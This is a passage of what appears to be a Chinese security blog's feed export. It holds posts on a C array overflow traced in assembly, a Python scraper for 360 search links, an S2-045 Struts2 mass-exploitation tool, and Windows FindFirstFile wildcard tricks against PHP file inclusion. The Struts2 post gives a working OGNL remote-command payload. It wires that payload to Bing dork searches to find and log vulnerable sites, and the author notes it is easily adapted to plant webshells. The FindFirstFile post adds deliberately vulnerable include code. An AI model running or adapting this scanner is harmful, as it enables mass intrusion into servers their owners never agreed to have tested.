<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">HelloWorld</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">int</span> i = <span class="number">0</span>;</div><div class="line">	<span class="keyword">int</span> a[] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>&#125;;</div><div class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;=<span class="number">10</span>; i++)</div><div class="line">	&#123;</div><div class="line">		a[i] = <span class="number">0</span>;</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"Hello World!\n"</span>);</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></div><div class="line">&#123;</div><div class="line">	HelloWorld();</div><div class="line">	getchar();</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<a id="more"></a>
<h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><p>当你运行上面这串代码的时候，因为c语言并不会对数组越界进行检查，所以是不会报错可以直接运行的，那么是什么原因导致了下面这张图的结果呢？</p>
<p><img src="https://ooo.0o0.ooo/2017/03/09/58c11551a36ea.gif" alt="GIF.gif"></p>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>我们可以调试跟进看看，在HelloWorld函数上加一个断点跟进去看看</p>
<p><img src="https://ooo.0o0.ooo/2017/03/09/58c11956dee36.png" alt="snipaste_20170309_165830.png"></p>
<p>这个函数主要的汇编代码如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">8:        int i = 0;</div><div class="line">00401038   mov         dword ptr [ebp-4],0</div><div class="line">9:        int a[] = &#123;1,2,3,4,5,6,7,8,9,10&#125;;</div><div class="line">0040103F   mov         dword ptr [ebp-2Ch],1</div><div class="line">00401046   mov         dword ptr [ebp-28h],2</div><div class="line">0040104D   mov         dword ptr [ebp-24h],3</div><div class="line">00401054   mov         dword ptr [ebp-20h],4</div><div class="line">0040105B   mov         dword ptr [ebp-1Ch],5</div><div class="line">00401062   mov         dword ptr [ebp-18h],6</div><div class="line">00401069   mov         dword ptr [ebp-14h],7</div><div class="line">00401070   mov         dword ptr [ebp-10h],8</div><div class="line">00401077   mov         dword ptr [ebp-0Ch],9</div><div class="line">0040107E   mov         dword ptr [ebp-8],0Ah</div><div class="line">10:       for(i=0; i&lt;=10; i++)</div><div class="line">00401085   mov         dword ptr [ebp-4],0</div><div class="line">0040108C   jmp         HelloWorld+77h (00401097)</div><div class="line">0040108E   mov         eax,dword ptr [ebp-4]</div><div class="line">00401091   add         eax,1</div><div class="line">00401094   mov         dword ptr [ebp-4],eax</div><div class="line">00401097   cmp         dword ptr [ebp-4],0Ah</div><div class="line">0040109B   jg          HelloWorld+97h (004010b7)</div><div class="line">11:       &#123;</div><div class="line">12:           a[i] = 0;</div><div class="line">0040109D   mov         ecx,dword ptr [ebp-4]</div><div class="line">004010A0   mov         dword ptr [ebp+ecx*4-2Ch],0</div><div class="line">13:           printf(&quot;Hello World!\n&quot;);</div><div class="line">004010A8   push        offset string &quot;Hello World!\n&quot; (0042301c)</div><div class="line">004010AD   call        printf (004011a0)</div><div class="line">004010B2   add         esp,4</div><div class="line">14:       &#125;</div><div class="line">004010B5   jmp         HelloWorld+6Eh (0040108e)</div><div class="line">15:   &#125;</div></pre></td></tr></table></figure></p>
<p>从<code>int i = 0;</code>开始看直到<code>for(i=0; i&lt;=10; i++)</code>的堆栈图是</p>
<p><img src="https://ooo.0o0.ooo/2017/03/09/58c11ad728904.png" alt="snipaste_20170309_170508.png"></p>
<p>第一次进入循环开始先把0放到了[ebp-4]，然后跳到了<code>00401097   cmp dword ptr [ebp-4],0Ah</code>以及下面的jg，这里的意思是如果ebp-4中存放的值比0A大那么就执行<code>jg HelloWorld+97h (004010b7)</code>跳到004010b7函数结束<br>第一次进入循环时，cmp之后（ebp-4中存放的值比0A小）执行<code>0040109D</code>处的语句，此时<code>ECX</code>中的值变成了[ebp-4]中的值也就是0，然后<code>mov dword ptr [ebp+ecx*4-2Ch],0</code>将0放到<code>ebp+ecx*4-2Ch</code>处也就是<code>EBP-2C</code>处，下面的两条语句不用管是执行输出的，然后到了<code>add  esp,4</code>将栈顶的值加4，这里我们无需关注栈顶，然后<code>jmp HelloWorld+6Eh (0040108e)</code>跳回到<code>0040108e</code>继续执行</p>
<p><img src="https://ooo.0o0.ooo/2017/03/09/58c11e41e5384.png" alt="snipaste_20170309_170508.png"></p>
<p>跳到<code>0040108E   mov  eax,dword ptr [ebp-4]</code>开始执行，紧接着这三条语句的作用是把<code>EBP-4</code>中的值加了1，也就是<code>EBP-4</code>中的值现在为1<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">mov eax,dword ptr [ebp-4]</div><div class="line">add eax,1</div><div class="line">mov dword ptr [ebp-4],eax</div></pre></td></tr></table></figure></p>
<p>cmp比较之后再次执行循环体，循环体完成后再次跳到<code>0040108e</code>，此时<code>EBP-28</code>的值变为了0，栈顶esp再次增加了4（这个例子中栈顶是不用关注的）</p>
<p><img src="https://ooo.0o0.ooo/2017/03/09/58c11fe590ae4.png" alt="snipaste_20170309_172648.png"></p>
<p>紧接着下次执行后</p>
<p><img src="https://ooo.0o0.ooo/2017/03/09/58c1202d748a0.png" alt="snipaste_20170309_172805.png"></p>
<p>直到这个数组长度为10的数组执行到第十次</p>
<p><img src="https://ooo.0o0.ooo/2017/03/09/58c120f1a650e.png" alt="snipaste_20170309_173122.png"></p>
<p>此时再次跳转到<code>0040108e</code>，然后<code>EBP-4</code>中的值再次增加了1，现在也就是<code>EBP-4</code>中的值变为了0A，cmp比较之后<code>EBP-4</code>中的值依旧不比0A大，接着执行<code>mov ecx,dword ptr [ebp-4]</code>，此时ECX的值变成了0A，接着执行<code>mov dword ptr [ebp+ecx*4-2Ch],0</code>也就是<code>mov dword ptr [ebp-4],0</code></p>
<p>然后呢，你发现了什么？？？就是他喵的<code>EBP-4</code>中的值变成了0</p>
<p><img src="https://ooo.0o0.ooo/2017/03/09/58c12263d566e.png" alt="snipaste_20170309_173729.png"></p>
<p>变成0代表着什么？？？<code>EBP-4</code>中的值是我们拿来干嘛的？是用来和0A进行cmp然后决定是否结束函数的，可是我们辛辛苦苦循环了10次，第11次全泡汤了，唯一的变化就是数组都成了0，栈顶的值变化了不少，然后再次cmp的时候，0和0A比，决定了你还是要循环，不管多少次，最后都会把你用来计数的地址<code>EBP-4</code>中的值清零</p>
<p>这也就是为什么上面这段c语言代码会一直不停地循环的原因</p>
<p><strong>转载请注明出处</strong></p>
]]></content>
      
        <categories>
            
            <category> 逆向 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 逆向 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[360搜索引擎取真实地址-python代码]]></title>
      <url>http://akkuman.coding.me/2017/03/08/360-Search-Engine-get-realURL-with-python.html</url>
      <content type="html"><![CDATA[<p>还是个比较简单的，不像百度有加密算法</p>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.so.com/link?url=http%3A%2F%2Fedu.sd.chinamobile.com%2Findex%2Fnews.do%3Faction%3DnoticeDetail%26id%3D22452&amp;q=inurl%3Anews.do&amp;ts=1488978912&amp;t=89c5361a44fe3f52931d25c6de262bb&amp;src=haosou</div></pre></td></tr></table></figure>
<p>网址是上面这个样子，没加密直接取就好了，去掉头<code>http://www.so.com/link?url=</code>和尾<code>&amp;q=</code>一直到末尾的部分，剩下的就可以吃了<br><a id="more"></a><br>那么规则我们就可以写出来了<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">a[<span class="string">'href'</span>][a[<span class="string">'href'</span>].index(<span class="string">'?url='</span>):a[<span class="string">'href'</span>].index(<span class="string">'&amp;q='</span>)][<span class="number">5</span>:]</div></pre></td></tr></table></figure></p>
<p><code>a[&#39;href&#39;]</code>是待处理网址,<code>a[&#39;href&#39;].index(&#39;?url=&#39;):a[&#39;href&#39;].index(&#39;&amp;q=&#39;)</code>的部分为<code>?url=http%3A%2F%2Fedu.sd.chinamobile.com%2Findex%2Fnews.do%3Faction%3DnoticeDetail%26id%3D22452</code></p>
<p>最后还需要用unquote解码</p>
<ul>
<li>在python3中是<code>urllib.parse.unquote</code></li>
<li>在python2中是<code>urllib.unquote</code></li>
</ul>
<h1 id="code"><a href="#code" class="headerlink" title="code"></a>code</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</div><div class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> unquote</div><div class="line"></div><div class="line">headers = &#123;</div><div class="line">    <span class="string">"User-Agent"</span> : <span class="string">"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0"</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">#爬取360搜索引擎真实链接，第一个参数关键词str，第二个参数爬取页数int</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse360</span><span class="params">(keyword, pagenum)</span>:</span></div><div class="line">    keywordsBaseURL = <span class="string">'https://www.so.com/s?q='</span> + str(keyword) + <span class="string">'&amp;pn='</span></div><div class="line">    pnum = <span class="number">1</span></div><div class="line">    <span class="keyword">while</span> pnum &lt;= int(pagenum):</div><div class="line">        baseURL = keywordsBaseURL + str(pnum)</div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            request = requests.get(baseURL, headers=headers)</div><div class="line">            soup = BeautifulSoup(request.text, <span class="string">"html.parser"</span>)</div><div class="line">            urls = [unquote(a[<span class="string">'href'</span>][a[<span class="string">'href'</span>].index(<span class="string">'?url='</span>):a[<span class="string">'href'</span>].index(<span class="string">'&amp;q='</span>)][<span class="number">5</span>:]) <span class="keyword">for</span> a <span class="keyword">in</span> soup.select(<span class="string">'li.res-list &gt; h3 &gt; a'</span>)]</div><div class="line">            <span class="keyword">for</span> url <span class="keyword">in</span> urls:</div><div class="line">                <span class="keyword">yield</span> url</div><div class="line">        <span class="keyword">except</span>:</div><div class="line">            <span class="keyword">yield</span> <span class="keyword">None</span></div><div class="line">        <span class="keyword">finally</span>:</div><div class="line">            pnum += <span class="number">1</span></div></pre></td></tr></table></figure>
<p>用法示例:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">for</span> url <span class="keyword">in</span> parse360(<span class="string">"keyword"</span>,<span class="number">10</span>):</div><div class="line">        <span class="keyword">if</span> url:</div><div class="line">            <span class="keyword">print</span> url</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            <span class="keyword">continue</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    main()</div></pre></td></tr></table></figure></p>
<h1 id="最后上一张测试图"><a href="#最后上一张测试图" class="headerlink" title="最后上一张测试图"></a>最后上一张测试图</h1><p><img src="https://ooo.0o0.ooo/2017/03/08/58c009f5b3c1d.png" alt="snipaste_20170308_214047.png"></p>
<p><strong>转载请注明出处</strong></p>
]]></content>
      
        <categories>
            
            <category> Python </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Python </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[s2-045漏洞批量检测工具]]></title>
      <url>http://akkuman.coding.me/2017/03/07/st2-045-batch-Test-Tool.html</url>
      <content type="html"><![CDATA[<p>今天晚上看老铁们在群里就这个st2-045漏洞讨论得火热，个人不太喜欢日站，本来想直接写个批量挂马的东西，但是想想还是算了，如果你有兴趣，改改也很容易，反正不关我的事</p>
<p>测试图<br><img src="https://ooo.0o0.ooo/2017/03/07/58beb8f48f7df.png" alt="TIM图片20170307212124.png"><br><a id="more"></a></p>
<p><strong>2017-3-8更新</strong></p>
<ul>
<li>增加了对.do关键词的支持，并且支持任何关键词了，之前我只考虑到了.action关键词并且写死了规则，py版本已经更新，<del>win版的exe未更新，需要的自行用pyinstaller打包为exe</del></li>
<li>之前采用whoami如果返回200状态码就判断存在漏洞，但是现在很多已经修复了，导致访问之后依旧会跳到正常页面返回200状态码，于是我改了一下判断，执行命令echo xxxx，如果返回结果中含有xxxx就证明漏洞存在</li>
<li>win版exe已经打包</li>
<li><strong>重要：建议大家都使用py版本，经过群友测试，exe版本对中文关键词的支持不太好，会出现错误，如果使用上有问题可评论</strong></li>
<li><strong>exe版本会出现扫描过慢的情况，强烈建议py版本，鉴于有些朋友说不会配置python环境，我在下面给出了例子</strong></li>
<li><strong>有些朋友说自定义关键字字典出错，这里要提一句，你的字典txt的编码需要是utf-8，有些东西因为写的比较快没考虑太全，见谅</strong><br><img src="https://ooo.0o0.ooo/2017/03/08/58bf96eadc438.png" alt="TIM图片20170308132948.png"></li>
</ul>
<p><strong>依赖包的安装</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">//首先你需要安装一个python，在安装图中记得把有pip的选项和add python to path类似的选项勾选上，然后安装完成后执行python -version和pip</div><div class="line">//如果执行python -version提醒你有问题，试着重启一下cmd或者电脑，或者检查你的path环境变量下有没有python的安装的路径，没有的话就加上</div><div class="line">//如果正常证明环境安装成功，如果执行pip提醒你没有pip，就把你python安装路径下的Scripts目录加到path环境变量，然后在命令行在执行以下代码</div><div class="line">pip install requests</div><div class="line">pip install beautifulsoup4</div></pre></td></tr></table></figure></p>
<p>对于此脚本所放置文件夹下必须有keyword.txt用来存放一行行的关键词<br>最开始是打算直接全部读取然后一个一个跑，不过感觉时间太漫长，测试时间太久<br>后来改成关键词就是自己输入，但是又感觉太麻烦<br>然后就变成了现在的读取关键词然后标号直接输入序号就可以<br>途中遇到了有的网址直接拒绝访问导致报错，还有的超时一直不返回报文，这些都解决了，个人测试的结果还可以，结果保存在一个txt下，至于你想再干些什么，不关我的事情了</p>
<p><strong>说明</strong><br>例子：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python s2-045.py 9 10</div></pre></td></tr></table></figure></p>
<p>第一个参数是你的文件名，第二个是关键词所对应的序号，第三个是你需要爬行的页数<br>序号与关键词的对应，可以直接运行<code>python s2-045.py</code>就可以产看帮助<br>脚本采用的bing搜索引擎，<strong>文件我会打包在下面</strong></p>
<p>上代码,<strong>python2和3通用</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># encoding:utf-8</span></div><div class="line"><span class="keyword">import</span> sys,requests</div><div class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</div><div class="line"></div><div class="line">keyword = &#123;&#125;</div><div class="line"><span class="keyword">with</span> open(<span class="string">"keyword.txt"</span>) <span class="keyword">as</span> f:</div><div class="line">    i = <span class="number">0</span></div><div class="line">    <span class="keyword">for</span> keywordLine <span class="keyword">in</span> f:</div><div class="line">        keyword[str(i)] = keywordLine.strip()</div><div class="line">        i += <span class="number">1</span></div><div class="line"></div><div class="line">usage = <span class="string">'''</span></div><div class="line">usage : python s2-045.py 0 10</div><div class="line"></div><div class="line">first parameter is your filename</div><div class="line">second parameter is your keyword's number which will be used by Bing</div><div class="line">Third parameter is the page number you want to crawl\n'''</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">(actionURL)</span>:</span></div><div class="line">    data = <span class="string">'--447635f88b584ab6b8d9c17d04d79918\</span></div><div class="line">    Content-Disposition: form-data; name="image1"\</div><div class="line">    Content-Type: text/plain; charset=utf-8\</div><div class="line">    \</div><div class="line">    x\</div><div class="line">    --447635f88b584ab6b8d9c17d04d79918--'</div><div class="line">	</div><div class="line">    header = &#123;</div><div class="line">        <span class="string">"Content-Length"</span> : <span class="string">"155"</span>, </div><div class="line">        <span class="string">"User-Agent"</span> : <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"</span>, </div><div class="line">        <span class="string">"Content-Type"</span> : <span class="string">"%&#123;(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo hereisaexp').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;"</span>, </div><div class="line">    &#125;</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        request = requests.post(actionURL, data=data, headers=header, timeout = <span class="number">10</span>)</div><div class="line">    <span class="keyword">except</span>:</div><div class="line">        <span class="keyword">return</span> <span class="string">"None"</span>, <span class="string">"Refused"</span></div><div class="line">    <span class="keyword">return</span> request.text, request.status_code</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">returnURLList</span><span class="params">()</span>:</span></div><div class="line">    keywordsBaseURL = <span class="string">'http://cn.bing.com/search?q='</span> +keyword[sys.argv[<span class="number">1</span>]]+ <span class="string">'&amp;first='</span></div><div class="line">    n =<span class="number">0</span></div><div class="line">    i = <span class="number">1</span></div><div class="line">    <span class="keyword">while</span> n &lt; int(sys.argv[<span class="number">2</span>]):</div><div class="line">        baseURL = keywordsBaseURL + str(i)</div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            req = requests.get(baseURL)</div><div class="line">            soup = BeautifulSoup(req.text, <span class="string">"html.parser"</span>)</div><div class="line">            text = soup.select(<span class="string">'li.b_algo &gt; h2 &gt; a'</span>)</div><div class="line">            <span class="keyword">if</span> <span class="string">'.action'</span> <span class="keyword">in</span> keyword[sys.argv[<span class="number">1</span>]]:</div><div class="line">                standardURL = [url[<span class="string">'href'</span>][:url[<span class="string">'href'</span>].index(<span class="string">'.action'</span>)]+<span class="string">'.action'</span> <span class="keyword">for</span> url <span class="keyword">in</span> text <span class="keyword">if</span> <span class="string">'.action'</span> <span class="keyword">in</span> url[<span class="string">'href'</span>]]</div><div class="line">            <span class="keyword">elif</span> <span class="string">'.do'</span> <span class="keyword">in</span> keyword[sys.argv[<span class="number">1</span>]]:</div><div class="line">                standardURL = [url[<span class="string">'href'</span>][:url[<span class="string">'href'</span>].index(<span class="string">'.do'</span>)]+<span class="string">'.do'</span> <span class="keyword">for</span> url <span class="keyword">in</span> text <span class="keyword">if</span> <span class="string">'.do'</span> <span class="keyword">in</span> url[<span class="string">'href'</span>]]</div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                standardURL = [url[<span class="string">'href'</span>] <span class="keyword">for</span> url <span class="keyword">in</span> text]</div><div class="line">        <span class="keyword">except</span>:</div><div class="line">            print(<span class="string">"HTTPERROR"</span>)</div><div class="line">            <span class="keyword">continue</span></div><div class="line">        i += <span class="number">10</span></div><div class="line">        n += <span class="number">1</span></div><div class="line">        <span class="keyword">yield</span> standardURL</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">3</span>:</div><div class="line">        print(usage)</div><div class="line">        <span class="keyword">for</span> k,v <span class="keyword">in</span> keyword.items():</div><div class="line">            print(<span class="string">"%s is %s"</span>%(k, v))</div><div class="line">        sys.exit()</div><div class="line"></div><div class="line">    <span class="keyword">for</span> urlList <span class="keyword">in</span> returnURLList():</div><div class="line">        <span class="keyword">for</span> actionURL <span class="keyword">in</span> urlList:</div><div class="line">            text, code = poc(actionURL)</div><div class="line">            <span class="keyword">if</span> <span class="string">'hereisaexp'</span> <span class="keyword">in</span> text:</div><div class="line">                print(str(code) + <span class="string">"----Successful----"</span> + actionURL + <span class="string">'\n'</span>)</div><div class="line">                <span class="keyword">with</span> open(<span class="string">"AvailableURL.txt"</span>,<span class="string">"a"</span>) <span class="keyword">as</span> f:</div><div class="line">                    f.write(actionURL+<span class="string">'\n'</span>)</div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                print(str(code)+<span class="string">'----'</span>+actionURL+<span class="string">'\n'</span>)</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    main()</div></pre></td></tr></table></figure>
<p><strong><a href="http://file.codecat.one" target="_blank" rel="external">下载地址</a></strong></p>
<p><strong>打包了win版，大家可以直接使用，例如在该exe目录下执行<del>（更新的并未打包出exe，如有需要可以自行用pyinstaller打包）</del></strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">s2-045.exe 9 10</div></pre></td></tr></table></figure></p>
<p><strong>其他用法参照上面</strong><br><strong>转载请注明出处</strong></p>
]]></content>
      
        <categories>
            
            <category> Tools </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Hacker </tag>
            
            <tag> Tools </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Windows FindFirstFile利用]]></title>
      <url>http://akkuman.coding.me/2017/03/04/Windows-FindFirst-Exploit.html</url>
      <content type="html"><![CDATA[<p>目前大多数程序都会对上传的文件名加入时间戳等字符再进行MD5，然后下载文件的时候通过保存在数据库里的文件ID读取文件路径，一样也实现了文件下载，这样我们就无法直接得到我们上传的webshell文件路径，但是当在Windows下时，我们只需要知道文件所在目录，然后利用Windows的特性就可以访问到文件，这是因为Windows在搜索文件的时候使用了FindFirstFile这一个winapi函数，该函数到一个文件夹(包含子文件夹)去搜索指定文件。</p>
<p>利用方法很简单，我们只要将文件名不可知部分之后的字符用”&lt;”或者”&gt;”代替即可，不过要注意一点是，只使用一个”&lt;”或者”&gt;”则只能代表一个字符，如果文件名是12345或者更长，这时候请求”1&lt;”或者”1&gt;”都是访问不到文件的，需要”1&lt;&lt;”才能访问到，代表继续往下搜索，有点像Windows的短文件名，这样我们还可以通过这个方式来爆破目录文件了。<br><a id="more"></a><br>我们来做个简单的测试，测试代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//1.php</span></div><div class="line"></div><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	<span class="keyword">include</span>($_GET[<span class="string">'file'</span>]);</div><div class="line"> <span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p> 再在同目录下新建一个文件名为”123456.txt”的文件，内容为<code>phpinfo()</code>函数，请求<code>/1.php?file=1&lt;&lt;</code>即可包含。<br> <img src="https://ooo.0o0.ooo/2017/03/04/58ba6a75887a8.png" alt="d8336189e9e8ab752ec855e7ed94a9b7.jpg.png"></p>
<h1 id="常用的漏洞代码"><a href="#常用的漏洞代码" class="headerlink" title="常用的漏洞代码"></a>常用的漏洞代码</h1><h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2> <figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[page])) &#123;</div><div class="line">		<span class="keyword">include</span>($_GET[page]);</div><div class="line">	&#125;<span class="keyword">else</span>&#123;</div><div class="line">		<span class="keyword">include</span> <span class="string">'show.php'</span>;</div><div class="line">	&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[page])) &#123;</div><div class="line">		<span class="keyword">include</span>(<span class="string">'./action/'</span> . $_GET[page]);</div><div class="line">	&#125;<span class="keyword">else</span>&#123;</div><div class="line">		<span class="keyword">include</span> <span class="string">'./action/show.php'</span>;</div><div class="line">	&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<h2 id="3"><a href="#3" class="headerlink" title="3"></a>3</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[page])) &#123;</div><div class="line">		<span class="keyword">include</span>(<span class="string">'./action/'</span>. $_GET[page] . <span class="string">'.php'</span>);</div><div class="line">	&#125;<span class="keyword">else</span>&#123;</div><div class="line">		<span class="keyword">include</span> <span class="string">'./action/show.php'</span>;</div><div class="line">	&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<h1 id="相关代码："><a href="#相关代码：" class="headerlink" title="相关代码："></a>相关代码：</h1><ol>
<li><p>php中代码：</p>
